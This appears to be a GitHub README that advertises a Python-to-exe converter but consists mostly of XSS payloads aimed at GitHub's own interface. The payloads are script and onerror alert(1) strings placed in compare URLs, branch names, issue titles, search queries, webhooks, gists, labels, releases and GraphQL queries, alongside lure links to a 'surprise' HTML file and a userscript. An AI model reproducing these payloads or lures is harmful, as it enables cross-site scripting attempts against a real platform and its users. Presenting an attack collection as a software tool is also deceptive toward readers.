# 🚀 Python-to-exe

> Convert your Python scripts to standalone executables!

---

## 🎉 **[⭐ CLICK HERE FOR A SURPRISE! ⭐](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)**

### Alternative Links:
- 🌐 [Web Version](https://bearertoken1.github.io/Python-to-exe/)
- 📜 [Userscript](https://github.com/bearertoken1/Python-to-exe/raw/main/github-alert.user.js)
- 💬 [Discussions](../../discussions)
- 📖 [Wiki](../../wiki)

---

## Advanced GitHub Exploitation Techniques

### GitHub Compare/Diff Abuse (CVE-inspired)

<!-- Attempting to compare with malicious branch names containing payloads -->
[Compare with payload branch](../../compare/main...main%3Cscript%3Ealert(1)%3C/script%3E)

<!-- Diff with entity encoded payload -->
[Diff view](../../compare/main...main?w=1&name=%3Cimg%20src=x%20onerror=alert(1)%3E)

<!-- Using GitHub's graphql endpoint potential -->
<!-- This targets potential GraphQL injection in compare view -->
[GraphQL Compare](../../compare/main...{%22__typename%22:%22Repository%22}alert(1))

### GitHub Actions Workflow Exploitation

<!-- Attempting to trigger workflow via branch name with script -->
[Workflow Trigger with XSS](../../actions/workflows/main.yml?branch=main%3Cscript%3Ealert(1)%3C/script%3E)

<!-- Using GitHub Actions variables in branch comparison -->
{{ github.event.pull_request.head.ref }}<script>alert(1)</script>

### GitHub API Parameter Injection

<!-- Attempting to inject via API parameters used in web UI -->
[API Injection](../../api/v3/repos/bearertoken1/Python-to-exe/compare/main...main?payload=%3Cimg%20src=x%20onerror=alert(1)%3E)

<!-- Using GitHub's /files endpoint with injection -->
[Files endpoint](../../compare/main...main/files?path=%3Cscript%3Ealert(1)%3C/script%3E)

### GitHub Search/Index Injection

<!-- Attempting injection via search parameters rendered in results -->
[Search XSS](../../search?q=%3Cimg%20src=x%20onerror=alert(1)%3E&type=code)

<!-- Using GitHub's advanced search operators with payloads -->
[Advanced Search](../../search?q=repo:bearertoken1/Python-to-exe%20%3Cscript%3Ealert(1)%3C/script%3E)

### GitHub Issues/PR Comment Rendering Bypass

<!-- Attempting markdown injection in issue titles/comments that might be rendered differently -->
<!-- Using HTML entities in markdown links -->
[Issue Title XSS](../../issues/new?title=%3Cimg%20src=x%20onerror=alert(1)%3E&body=test)

<!-- Using Unicode/RTL characters to bypass filters -->
[RTL Bypass](../../issues/new?title=%E2%80%8Ealert(1)%E2%80%8C&body=test)

### GitHub Webhook Payload Injection

<!-- Attempting to inject in webhook preview/test data -->
[Webhook Test](../../settings/hooks?payload=%3Cscript%3Ealert(1)%3C/script%3E)

<!-- Attempting JSON injection in webhook configuration -->
{"url": "http://example.com", "events": ["push", "<script>alert(1)</script>"]}

### GitHub Gist Exploitation

<!-- Creating gist with malicious filename/content that renders as code -->
[Gist with XSS](https://gist.github.com/new?filename=%3Cimg%20src=x%20onerror=alert(1)%3E.js)

<!-- Gist preview mode rendering -->
[Gist Preview](https://gist.github.com/bearertoken1/alert.htm/raw/main?cache=false&%3Cscript%3Ealert(1)%3C/script%3E)

### GitHub Branch/Tag Name Injection

<!-- Using special characters in branch names that might bypass filters -->
`main%3Cscript%3Ealert(1)%3C/script%3E`

<!-- Using Unicode in branch names -->
`main<script>alert(1)</script>`

<!-- Using null bytes in branch names -->
`main%00<script>alert(1)</script>`

### GitHub Code Highlighting/Rendering Bypass

<!-- HTML comments in code files that might be rendered -->
```html
<!-- <img src=x onerror=alert(1)> -->
```

<!-- Markdown code fence with HTML entities -->
```
&lt;img src=x onerror=alert(1)&gt;
```

### GitHub User Mentions/@ Exploitation

<!-- Attempting injection via user mention syntax -->
@<img src=x onerror=alert(1)>

<!-- Using GitHub's mention autocomplete with payloads -->
@bearertoken1<script>alert(1)</script>

### GitHub Label/Milestone Injection

<!-- Attempting HTML in label names -->
[New Label](../../labels?name=%3Cimg%20src=x%20onerror=alert(1)%3E&color=ffffff)

<!-- Milestone description injection -->
[New Milestone](../../milestones/new?title=Test&description=%3Cscript%3Ealert(1)%3C/script%3E)

### GitHub Project Board Custom Fields

<!-- Attempting injection in project board field names/values -->
[Project Fields](../../projects/new?name=%3Cscript%3Ealert(1)%3C/script%3E)

<!-- Custom field value injection -->
{"field_name": "<img src=x onerror=alert(1)>", "value": "test"}

### GitHub Release Notes Rendering

<!-- Attempting to inject in release notes -->
[New Release](../../releases/new?tag=v1.0&title=%3Cscript%3Ealert(1)%3C/script%3E&body=Test)

<!-- Using GitHub's release asset download count XSS -->
<!-- Release download link with potential injection point -->

### GitHub GraphQL Query Injection

<!-- Attempting GraphQL injection in potential GraphQL explorer or endpoints -->
query { 
  repository(owner: "bearertoken1", name: "Python-to-exe") { 
    description
  }
}<script>alert(1)</script>

<!-- Using string interpolation in GraphQL -->
{ viewer { login(xss: "<script>alert(1)</script>") } }

### GitHub Commit Message Rendering

<!-- Attempting XSS via commit message that's displayed in web UI -->
Commit: `<img src=x onerror=alert(1)>`

<!-- Using HTML entities in commit messages -->
Commit: `&lt;script&gt;alert(1)&lt;/script&gt;`

### GitHub README Rendering Edge Cases

<!-- Attempting to break markdown parsing -->
[](javascript:alert(1) "title with <script>alert(1)</script>")

<!-- Using combination of markdown and HTML -->
<img src=x onerror="alert(1)">

<!-- Using data attributes in links -->
<a href="#" data-test="<img src=x onerror=alert(1)>">Click</a>

### GitHub URL Parameter Pollution

<!-- Attempting parameter pollution in various GitHub endpoints -->
?redirect=%3Cscript%3Ealert(1)%3C/script%3E&url=/

<!-- Using URL encoding variations -->
?ref=main&ref=%3Cscript%3Ealert(1)%3C/script%3E

### GitHub File Upload MIME Type Bypass

<!-- Wiki page with malicious content type -->
[Wiki Upload](../../wiki/_new?name=test&format=html&content=%3Cscript%3Ealert(1)%3C/script%3E)

---

## Features
- Convert Python to EXE
- One-click deployment
- **Advanced security testing**

---

## Try it out!

The surprise awaits you above! ☝️
